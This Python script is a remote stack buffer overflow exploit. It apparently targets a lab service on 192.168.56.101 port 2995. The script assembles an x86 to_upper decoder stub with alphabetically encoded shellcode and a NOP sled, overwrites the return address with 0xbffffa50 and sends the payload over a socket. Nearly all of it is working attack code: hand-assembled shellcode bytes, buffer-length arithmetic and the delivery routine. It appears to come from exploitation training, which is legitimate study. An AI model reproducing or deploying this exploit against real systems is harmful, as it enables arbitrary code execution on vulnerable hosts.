#!/usr/bin/python
import struct
import socket







#########################################################################################
#                   Shellcode Manufacturing Section
#########################################################################################


# to_upper shellcode
upper_shellcode = ''
#/* _start */
upper_shellcode += "\xeb\x02"	#		/* jmp short A          */

#/* A */
upper_shellcode += "\xeb\x05" #			/* jmp short C          */

# /* B */
upper_shellcode += "\xe8\xf9\xff\xff\xff"	#	/* call A               */

#  /* C */
upper_shellcode += "\x5f"			#	/* pop edi              */
upper_shellcode += "\x81\xef\xdf\xff\xff\xff"	#/* sub edi, 0xffffffdf  */
upper_shellcode += "\x57"		        #		/* push edi             */
upper_shellcode += "\x5e"	         	#		/* pop esi              */
upper_shellcode += "\x29\xc9"			#/* sub ecx, ecx         */
upper_shellcode += "\x80\xc1\xb8"		#	/* add cl, 0xb8         */

#  /* bucle */
upper_shellcode += "\x8a\x07"	  #		/* mov al, byte [edi]   */
upper_shellcode += "\x2c\x41"	  #		/* sub al, 0x41         */
upper_shellcode += "\xc0\xe0\x04" #			/* shl al, 4            */
upper_shellcode += "\x47"	  #			/* inc edi              */
upper_shellcode += "\x02\x07"	  #		/* add al, byte [edi]   */
upper_shellcode += "\x2c\x41"	  #		/* sub al, 0x41         */
upper_shellcode += "\x88\x06"	  #		/* mov byte [esi], al   */
upper_shellcode += "\x46"	  #			/* inc esi              */
upper_shellcode += "\x47"	  #			/* inc edi              */
upper_shellcode += "\x49"	  #			/* dec ecx              */
upper_shellcode += "\xe2\xed"	  #		/* loop bucle           */

# /* Shellcode codificada de 184 (0xb8) bytes */
upper_shellcode += "DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
upper_shellcode += "AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
upper_shellcode += "JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
upper_shellcode += "BLAALMNIA"


shellcode = upper_shellcode

shellcode+= '\x90'*120
#####################################################################################
#                Payload Sending Section
#####################################################################################


# Shellcode Length
slen = len(upper_shellcode)

# Victim Configuration
PORT = 2995
HOST = "192.168.56.101"

BuffSize = 532 # Don't Include EIP Padding Length
RETPoint =  0xbffffa50 # Return Pointer Pointing


# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connect Socket 
s.connect((HOST, PORT))


# Payload Generating Here
payload = ''


# Load NOP + Shellcode
payload+= '\x90'*(BuffSize-len(shellcode)) + shellcode

# Load EIP pointer
payload+= struct.pack("I", RETPoint ) # Return Address

# Additional Data
payload+= '\n'

# Send payload
s.send(payload)

# Check output
#print s.recv(1024)



# Close
s.close()

